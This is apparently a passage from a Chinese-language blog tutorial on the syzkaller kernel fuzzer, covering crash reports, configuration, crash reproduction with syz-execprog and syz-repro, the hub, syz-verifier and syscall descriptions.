<h2 id="崩溃报告"><a href="#崩溃报告" class="headerlink" title="崩溃报告"></a>崩溃报告</h2><p>当<code>syzkaller</code>发现一个崩溃者时，它会将其信息保存到<code>workdir/crashes</code>目录中。该目录为每一个独特的崩溃类型包含一个子目录。每个子目录都包含一个描述文件，其中有一个唯一的字符串来标识崩溃（用于识别错误和重复计算）；还有多达100个<code>logN</code>和<code>reportN</code>文件，每个测试机崩溃一对。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">- crashes/</span><br><span class="line">  - 6e512290efa36515a7a27e53623304d20d1c3e</span><br><span class="line">    - description</span><br><span class="line">    - log0</span><br><span class="line">    - report0</span><br><span class="line">    - log1</span><br><span class="line">    - report1</span><br><span class="line">    ...</span><br><span class="line">  - 77c578906abe311d06227b9dc3bffa4c52676f</span><br><span class="line">    - description</span><br><span class="line">    - log0</span><br><span class="line">    - report0</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p>描述是使用一组正则表达式来提取的。如果你使用的是不同的内核架构，或者只是看到了以前没有见过的内核错误信息，那么这个集合可能需要被扩展。</p>
<p><code>logN</code>文件包含原始的<code>syzkaller</code>日志，包括内核控制台输出以及崩溃前执行的程序。这些日志可以提供给<code>syz-repro</code>工具进行崩溃定位和最小化，或者提供给<code>syz-execprog</code>工具进行手动定位。<code>reportN</code>文件包含经过处理和符号化的内核崩溃报告（例如KASAN报告）。通常你只需要一对这样的文件（即<code>log0</code>和<code>report0</code>），因为它们都可能是描述同一个内核错误。然而，<code>syzkaller</code>会保存多达100个这样的文件，以应对崩溃重现性差的情况，或者你只是想看一组崩溃报告来推断一些相似性或差异。</p>
<p>有3种特殊的崩溃类型：</p>
<ol>
<li>测试机没有输出：测试机没有产生任何输出；</li>
<li>与测试机失去连接：与测试机的SSH连接意外地关闭了；</li>
<li>测试机没有执行程序：机器看起来还活着，但长时间没有执行测试程序。</li>
</ol>
<p>最有可能的是，你不会看到这些<code>reportN</code>文件（例如，如果测试机器没有输出，就没有什么可以写进报告）。有时这些崩溃表明<code>syzkaller</code>本身有错误（特别是当你在日志中看到<code>Go panic</code>消息时）。然而，通常情况下，它们意味着内核锁死或类似的坏情况（这里有几个这样发现的bug的例子：<a target="_blank" rel="noopener" href="https://groups.google.com/d/msg/syzkaller/zfuHHRXL7Zg/Tc5rK8bdCAAJ">1</a>，<a target="_blank" rel="noopener" href="https://groups.google.com/d/msg/syzkaller/kY_ml6TCm9A/wDd5fYFXBQAJ">2</a>，<a target="_blank" rel="noopener" href="https://groups.google.com/d/msg/syzkaller/OM7CXieBCoY/etzvFPX3AQAJ">3</a>）。</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>git源码：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/google/syzkaller</span><br></pre></td></tr></table></figure>

<p>直接make即可，但是由于没有设置SOURCEDIR，所以Executor无法编译：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Executor will not be built</span><br><span class="line">Native cross-compiler is missing/broken:</span><br><span class="line">SOURCEDIR is not <span class="built_in">set</span></span><br></pre></td></tr></table></figure>

<h2 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h2><p>启动<code>syz-manager</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-manager -config my.cfg</span><br></pre></td></tr></table></figure>

<h3 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h3><p>json格式，具体包含哪些参数可以在<code>syzkaller/pkg/mgrconfig/config.go</code>中进行查看，示例文件如下：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;target&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/amd64&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;myhost.com:56741&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;kernel_obj&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/linux/&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./testdata/wheezy.img&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;syzkaller&quot;</span><span class="punctuation">:</span> <span class="string">&quot;./testdata/syzkaller&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;disable_syscalls&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;keyctl&quot;</span><span class="punctuation">,</span> <span class="string">&quot;add_key&quot;</span><span class="punctuation">,</span> <span class="string">&quot;request_key&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;suppressions&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;some known bug&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;procs&quot;</span><span class="punctuation">:</span> <span class="number">4</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;qemu&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;vm&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;count&quot;</span><span class="punctuation">:</span> <span class="number">16</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;cpu&quot;</span><span class="punctuation">:</span> <span class="number">2</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;mem&quot;</span><span class="punctuation">:</span> <span class="number">2048</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;kernel&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/linux/arch/x86/boot/bzImage&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;initrd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;linux/initrd&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="Crash"><a href="#Crash" class="headerlink" title="Crash"></a>Crash</h3><p>一旦 syzkaller 在其中一个 VM 中检测到内核Crash，它将自动启动复现这个Crash的过程（除非配置文件中指定了<code>&quot;reproduce&quot;: false</code>）。默认情况下，syzkaller将使用 4 个虚拟机来复现Crash，然后最小化POC。由于可能所有虚拟机都在进行复现过程，从而使fuzz停止。</p>
<p>自动复现Crash的时间可能无法控制，所以可以选择手动复现。</p>
<p>如果复现成功，syzkaller将给出两种POC：syzkaller 程序或 C 程序，默认是C程序。如果是syzkaller 程序，则运行和调试的方法在<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/reproducing_crashes.md">这里</a>。</p>
<h4 id="复现Crash"><a href="#复现Crash" class="headerlink" title="复现Crash"></a>复现Crash</h4><p>为<code>syzkaller bug</code>创建复制程序的过程是自动化的，然而它并不完美，所以syzkaller提供了一些手动执行和复制程序的工具。</p>
<p>在管理器<code>workdir</code>&#x2F;<code>crashes dir</code>中创建的崩溃日志包含了崩溃前刚刚执行的程序。在并行执行模式下（当管理器配置中的procs参数设置为大于1的值时），导致崩溃的程序不一定紧接在它之前；有罪的程序可能在之前的某个地方。有两个工具可以帮助你识别和减少导致崩溃的程序：<code>tools/sy-execprog</code>和<code>tools/sy-prog2c</code>。</p>
<p><code>tools/syz-execprog</code>执行单个syzkaller程序或一组不同模式的程序（一次或无限次循环；线程&#x2F;碰撞模式（见下文），有无覆盖率收集）。你可以先循环运行崩溃日志中的所有程序，检查其中至少有一个程序确实崩溃了内核：<code>./syz-execprog -executor=./syz-executor -repeat=0 -procs=16 -cover=0 crash-log</code>。然后尝试找出导致崩溃的单个程序，你可以用<code>./syz-execprog -executor=./syz-executor -repeat=0 -procs=16 -cover=0 file-with-a-single-program</code>测试程序。</p>
<p>注意：<code>syz-execprog</code>是在本地执行程序。所以你需要把<code>syz-execprog</code>和<code>syz-executor</code>复制到一个有测试内核的虚拟机中，并在那里运行它。</p>
<p>一旦有了一个导致崩溃的程序，试着从程序中删除个别的系统调用（可以在行首用#注释单行），并删除不必要的数据（例如用<code>&amp;(0x7f0000001000)=&quot;73656c6600 &quot;</code>系统调用参数替换<code>&amp;(0x7f0000001000)=nil</code>），从而使其最小化。你也可以尝试把所有的<code>mmap</code>调用凝聚成一个单一的<code>mmap</code>调用来映射整个需要的区域。同样，用<code>syz-execprog</code>工具测试最小化。</p>
<p>现在有了一个最小化的程序，用<code>./syz-execprog -threaded=0 -collide=0</code>标志检查崩溃是否还能重现。如果不是，那么你将需要在后面做一些额外的工作。</p>
<p>现在，对该程序运行<code>syz-prog2c</code>工具。它将给你可执行的C语言源代码。如果崩溃在<code>-threaded/collide=0</code>标记下重现，那么这个C程序也应该导致崩溃。</p>
<p>如果崩溃在<code>-threaded/collide=0</code>标记下不能重现，那么你需要最后一步。你可以把线程模式看作是每个系统调用都在自己的线程中执行。为了模拟这样的执行模式，将各个系统调用移到独立的线程中。你可以在这里看到一个例子：<a target="_blank" rel="noopener" href="https://groups.google.com/d/msg/syzkaller/fHZ42YrQM-Y/Z4Xf-BbUDgAJ%E3%80%82">https://groups.google.com/d/msg/syzkaller/fHZ42YrQM-Y/Z4Xf-BbUDgAJ。</a></p>
<p>这个过程在某种程度上在<code>syz-repro</code>工具中是自动化的。你需要给它你的管理器配置和崩溃报告文件。而且你可以参考配置文件的例子：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./syz-repro -config my.cfg crash-qemu-1-145574545926572691</span><br></pre></td></tr></table></figure>

<p>它将试图找到违规的程序并将其最小化。但由于有很多因素会影响重现性，它并不总是有效。</p>
<h3 id="Hub"><a href="#Hub" class="headerlink" title="Hub"></a>Hub</h3><p>对于多个<code>syz-manager</code>实例，应该是对应的分布式fuzz。</p>
<p><code>syz-hub</code>程序可以用来把几个<code>syz-manager</code>连接在一起，让它们交换程序。</p>
<p>用<code>make hub</code>建立<code>syz-hub</code>。然后创建一个配置文件，其内容如下。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;http&quot;</span><span class="punctuation">:</span> <span class="string">&quot;:80&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;rpc&quot;</span><span class="punctuation">:</span>  <span class="string">&quot;:55555&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;workdir&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/syzkaller/workdir&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;clients&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">		<span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;manager1&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6sCFsJVfyFQVhWVKJpKhHcHxpCH0gAxL&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;manager2&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;FZFSjthHHf8nKm2cqqAcAYKM5a3XM4Ao&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;manager3&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fTrIBQCmkEq8NsvQXZiOUyop6uWLBuzf&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>然后用<code>bin/syz-hub -config hub.cfg</code>启动它。在每个管理器的<code>syz-manager</code>配置文件中添加以下附加参数。</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;manager1&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;hub_client&quot;</span><span class="punctuation">:</span> <span class="string">&quot;manager1&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;hub_addr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.2.3.4:55555&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;hub_key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;6sCFsJVfyFQVhWVKJpKhHcHxpCH0gAxL&quot;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure>

<p>启动<code>syz-manager</code>。一旦他们对本地语料库进行分流，他们将连接到hub并开始交换输入。hub和<code>syz-manager</code>的网页都会显示他们从hub发送&#x2F;接收了多少输入。</p>
<h1 id="设置syzkaller"><a href="#设置syzkaller" class="headerlink" title="设置syzkaller"></a>设置syzkaller</h1><p><a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/akaros/README.md">Akaros</a>、 <a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/freebsd/README.md">FreeBSD</a>、 <a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/fuchsia/README.md">Fuchsia</a>、 <a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/netbsd/README.md">NetBSD</a>、 <a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/openbsd/setup.md">OpenBSD</a>、 <a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/windows/README.md">Windows</a>、<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/linux/setup.md">Linux</a>。</p>
<p>运行，访问<code>http://127.0.0.1:56741</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ ./bin/syz-manager -config=my.cfg</span><br><span class="line">2017/06/14 16:39:05 loading corpus...</span><br><span class="line">2017/06/14 16:39:05 loaded 0 programs (0 total, 0 deleted)</span><br><span class="line">2017/06/14 16:39:05 serving http on http://127.0.0.1:56741</span><br><span class="line">2017/06/14 16:39:05 serving rpc on tcp://127.0.0.1:34918</span><br><span class="line">2017/06/14 16:39:05 booting <span class="built_in">test</span> machines...</span><br><span class="line">2017/06/14 16:39:05 <span class="built_in">wait</span> <span class="keyword">for</span> the connection from <span class="built_in">test</span> machine...</span><br><span class="line">2017/06/14 16:39:59 received first connection from <span class="built_in">test</span> machine vm-9</span><br><span class="line">2017/06/14 16:40:05 executed 293, cover 43260, crashes 0, repro 0</span><br><span class="line">2017/06/14 16:40:15 executed 5992, cover 88463, crashes 0, repro 0</span><br><span class="line">2017/06/14 16:40:25 executed 10959, cover 116991, crashes 0, repro 0</span><br><span class="line">2017/06/14 16:40:35 executed 15504, cover 132403, crashes 0, repro 0</span><br></pre></td></tr></table></figure>

<h1 id="故障排除"><a href="#故障排除" class="headerlink" title="故障排除"></a>故障排除</h1><p>检查运行的 syzkaller 是否有问题：</p>
<ul>
<li>使用<code>-debug</code>命令行选项，使 syzkaller 从<code>syz-manager</code>顶层程序和<code>syz-fuzzer</code>实例打印所有可能的调试输出。使用此选项 syzkaller 将只运行一个 VM 实例。</li>
<li>使用<code>-vv N</code>命令行选项，增加<code>syz-manager</code>顶层程序和<code>syz-fuzzer</code>实例（转到<code>crashes</code>工作目录子目录中的输出文件）的日志输出量。N 值越高，输出越多。</li>
<li>如果日志记录表明执行程序存在问题（例如<code>executor failure</code>），尝试手动运行一小段系统调用：<ul>
<li>复制<code>syz-executor</code>和<code>syz-execprog</code>到正在运行的 VM中。</li>
<li>在 VM 中运行<code>./syz-execprog -executor ./syz-executor -debug sampleprog</code>，sampleprog 是一个简单的系统调用脚本（例如只包含<code>getpid()</code>）。</li>
<li>例如，如果报告<code>clone</code>失败，这可能表明测试内核不支持所有必需的命名空间。在这种情况下，<code>syz-execprog</code>使用该选项运行测试<code>-sandbox=setuid</code>可以解决问题，因此需要将主配置更新为设置<code>sandbox</code>为<code>setuid</code>.</li>
</ul>
</li>
</ul>
<p>有关 Linux 内核特定的故障排除建议，可以参考<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/linux/troubleshooting.md">这里</a>。</p>
<h1 id="研究"><a href="#研究" class="headerlink" title="研究"></a>研究</h1><p>看<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/research.md">这里</a>。</p>
<h1 id="技术会谈和文章"><a href="#技术会谈和文章" class="headerlink" title="技术会谈和文章"></a>技术会谈和文章</h1><p>看<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/talks.md">这里</a>。</p>
<h1 id="syzbot"><a href="#syzbot" class="headerlink" title="syzbot"></a>syzbot</h1><p>这是一个机器人，用于持续的fuzz多个内核。详细的内容参考<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/syzbot.md">这里</a>。</p>
<p>代码在<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/dashboard/app">这里</a>。架构如下：</p>
<p><img src="https://github.com/google/syzkaller/blob/master/docs/syzbot_architecture.png?raw=true" alt="syzbot_architecture.png"></p>
<h1 id="syz-verifier"><a href="#syz-verifier" class="headerlink" title="syz_verifier"></a>syz_verifier</h1><p><code>syz-verifier</code>是一种差分模糊测试工具，可以交叉比较程序在不同版本的 Linux 内核上的执行情况，以检测语义错误。架构如下：</p>
<p><img src="https://github.com/google/syzkaller/raw/master/docs/syz_verifier_structure.png" alt="架构概述"></p>
<p><code>syz-verifier</code>进程启动并管理带有要进行交叉比较的内核的虚拟机实例。它也会启动虚拟机上的<code>syz-runner</code>进程。host和client之间的通信是通过RPC完成的。</p>
<p><code>syz-verifier</code>生成并通过RPC向<code>syz-runner</code>连续发送程序，而<code>syz-runner</code>则负责启动<code>syz-executor</code>进程，并将程序转化为这些程序的输入。<code>syz-executor</code>处理输入，从而触发内核中一系列的<code>syscall</code>。然后，<code>syz-runner</code>收集结果并将其送回host。</p>
<p>目前，这些结果包含了每个系统调用返回的<code>errnos</code>。当<code>syz-verifier</code>收到所有内核对某一特定程序的运行结果后，它会对其进行验证以确保它们是相同的。如果发现不相同，就在所有内核上重新运行该程序，以确保不相同不是片状的（即不是因为某些背景活动或外部状态而发生的）。如果在所有的重新运行中都出现了不匹配，<code>syz-verifier</code>就会为该程序创建一份报告，并将其写入<code>persistent storage</code>。</p>
<h2 id="如何使用syz-verifier"><a href="#如何使用syz-verifier" class="headerlink" title="如何使用syz-verifier"></a>如何使用<code>syz-verifier</code></h2><p>源码下载完后，直接<code>make</code>。</p>
<p>要开始使用该工具，需要为要包含在验证中的每个内核创建单独的配置文件。可以在<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/linux/setup_ubuntu-host_qemu-vm_x86-64-kernel.md#syzkaller">此处</a>找到 Linux 配置的示例。</p>
<p>如果想从一组特定的系统调用中生成程序，可以使用<code>enable_syscalls</code>选项在内核配置文件中列出这些调用。如果想禁用某些系统调用，可以使用<code>disable_syscalls</code>选项。</p>
<p>运行<code>syz-verifier</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/syz-verifier -configs=kernel0.cfg,kernel1.cfg</span><br></pre></td></tr></table></figure>

<p><code>syz-verifier</code>在执行过程中会收集统计数据。默认情况下，这些数据会被打印到stdout，也可以用stat标志来指定文件。</p>
<h2 id="如何解释结果"><a href="#如何解释结果" class="headerlink" title="如何解释结果"></a>如何解释结果</h2><p>结果在<code>workdir/results</code>中。</p>
<p>当<code>syz-verifier</code>在程序中发现不匹配时，它将为该程序创建一个报告。该报告列出了每个系统调用返回的结果，由每个交叉比较的内核，突出显示发现不匹配的结果。系统调用按照它们在程序中出现的顺序列出。例如：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ERRNO mismatches found <span class="keyword">for</span> program:</span><br><span class="line"></span><br><span class="line">[=] io_uring_register<span class="variable">$IORING_REGISTER_PERSONALITY</span>(0xffffffffffffffff, 0x9, 0x0, 0x0)</span><br><span class="line">        ↳ Pool: 0, Flags: 3, Errno: 9 (bad file descriptor)</span><br><span class="line">        ↳ Pool: 1, Flags: 3, Errno: 9 (bad file descriptor)</span><br><span class="line"></span><br><span class="line">[=] syz_genetlink_get_family_id<span class="variable">$devlink</span>(&amp;(0x7f0000000000), 0xffffffffffffffff)</span><br><span class="line">        ↳ Pool: 0, Flags: 3, Errno: 2 (no such file or directory)</span><br><span class="line">        ↳ Pool: 1, Flags: 3, Errno: 2 (no such file or directory)</span><br><span class="line"></span><br><span class="line">[!] r1 = io_uring_setup(0x238e, &amp;(0x7f0000000240)=&#123;0x0, 0xf39a, 0x20, 0x0, 0x146&#125;)</span><br><span class="line">        ↳ Pool: 0, Flags: 3, Errno: 6 (no such device or address)</span><br><span class="line">        ↳ Pool: 1, Flags: 3, Errno: 9 (bad file descriptor)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>结果的顺序是由配置文件传递的顺序决定的，所以<code>Pool: 0</code>表示使用<code>kernel0.cfg</code>创建的内核所产生的结果，以此类推。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/pkg/ipc/ipc.go#L82">Flags</a>可用于确定系统调用达到的状态：</p>
<ul>
<li><code>0</code>&#x3D; 系统调用甚至没有开始</li>
<li><code>1</code>&#x3D; 系统调用开始</li>
<li><code>3</code>&#x3D; 系统调用完成执行</li>
<li><code>7</code>&#x3D; 系统调用被阻止</li>
</ul>
<h1 id="syz-testbed"><a href="#syz-testbed" class="headerlink" title="syz-testbed"></a>syz-testbed</h1><p><code>syz-testbed</code>是一种评估不同 syzkaller 版本（或配置）性能的工具。该工具自动检查 syzkaller 存储库、构建它们、运行 <code>syz-manager</code>并收集&#x2F;总结它们的结果。详见<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/syz_testbed.md">这里</a>。</p>
<h1 id="Syscall描述"><a href="#Syscall描述" class="headerlink" title="Syscall描述"></a>Syscall描述</h1><p><code>syzkaller</code>使用系统调用接口的声明性描述来操作程序（系统调用序列）。例如：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">open(file filename, flags flags[open_flags], mode flags[open_mode]) fd</span><br><span class="line"><span class="title function_">read</span><span class="params">(fd fd, buf buffer[out], count len[buf])</span></span><br><span class="line"><span class="title function_">close</span><span class="params">(fd fd)</span></span><br><span class="line">open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH</span><br></pre></td></tr></table></figure>

<p>描述包含在<code>sys/$OS/*.txt</code>文件中。例如，有关 Linux MIDI 接口的描述，参考<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/sys/linux/dev_snd_midi.txt">sys&#x2F;linux&#x2F;dev_snd_midi.txt</a>。</p>
<h2 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h2><p>然后使用翻译后的描述来生成、变异、执行、最小化、序列化和反序列化程序。程序是具有具体参数具体值的系统调用序列。这是一个程序的示例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r0 = open(&amp;(<span class="number">0x7f0000000000</span>)=<span class="string">&quot;./file0&quot;</span>, <span class="number">0x3</span>, <span class="number">0x9</span>)</span><br><span class="line">read(r0, &amp;(<span class="number">0x7f0000000000</span>), <span class="number">42</span>)</span><br><span class="line">close(r0)</span><br></pre></td></tr></table></figure>

<p>在实际操作中，<code>syzkaller</code>使用类似AST的内存表示法，由<code>prog/prog.go</code>中定义的<code>Call</code>和<code>Arg</code>值组成。这种表示法被用来<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/prog/analysis.go">分析</a>、<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/prog/rand.go">生成</a>、<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/prog/mutation.go">变异</a>、<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/prog/minimization.go">最小化</a>、<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/prog/validation.go">验证</a>等程序。</p>
<p>内存中的表示法可以<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/prog/encoding.go">转换</a>为文本形式，以存储在磁盘语料库中，并进行展示，等等。</p>
<p>还有另一种程序的<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/prog/decodeexec.go">二进制表示法</a>（称为exec），它更简单，不包含丰富的类型信息（不可逆），用于由<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/executor/executor.cc"><code>executor</code></a>实际执行（解释）程序。</p>
<h2 id="描述新的系统调用"><a href="#描述新的系统调用" class="headerlink" title="描述新的系统调用"></a>描述新的系统调用</h2><p>本节介绍如何扩展 <code>syzkaller</code> 以允许对更多内核接口进行模糊测试。</p>
<p>目前，所有的系统调用描述都是手动编写的。有一个开放的<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/issues/590">问题</a>是为这个过程提供一些帮助，以及一些正在进行的工作，但我们还没有达到完全自动化的方式来生成描述。有一个<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/headerparser_usage.md">headerparser</a>工具，可以从头文件中自动生成部分描述。</p>
<p>实现对一个新的内核接口的模糊处理。</p>
<ul>
<li><p>研究该接口，找出使用该接口需要哪些系统调用。有时除了源代码外，什么都没有，但以下的东西可能会有帮助：</p>
<ul>
<li>在互联网上搜索接口的名称和&#x2F;或一些独特的常数。</li>
<li>在内核中搜索<code>Documentation</code>&#x2F; <code>dir</code>。</li>
<li>搜索内核中的<code>tool</code>&#x2F;<code>testing</code>&#x2F; <code>dir</code>。</li>
<li>寻找源代码中的大型注释块。</li>
<li>通过<code>git blame</code>或<code>git log</code>找到添加接口的提交，并阅读提交描述。</li>
<li>阅读或追踪已知使用该接口的库或应用程序的源代码。</li>
</ul>
</li>
<li><p>以<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/docs/syscall_descriptions_syntax.md">语法文档</a>和<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/sys/linux">现有的描述</a>为例，在相应的文件中添加该接口的声明性描述：</p>
<ul>
<li><code>sys/linux/&lt;subsystem&gt;.txt</code>文件保存了特定内核子系统的系统调用，例如<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/sys/linux/bpf.txt"><code>bpf.txt</code></a>或<a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/sys/linux/socket.txt"><code>socket.txt</code></a>。</li>
<li><a target="_blank" rel="noopener" href="https://github.com/google/syzkaller/blob/master/sys/linux/sys.txt"><code>sys/linux/sys.txt</code></a>文件保存了更多通用系统调用的描述。</li>
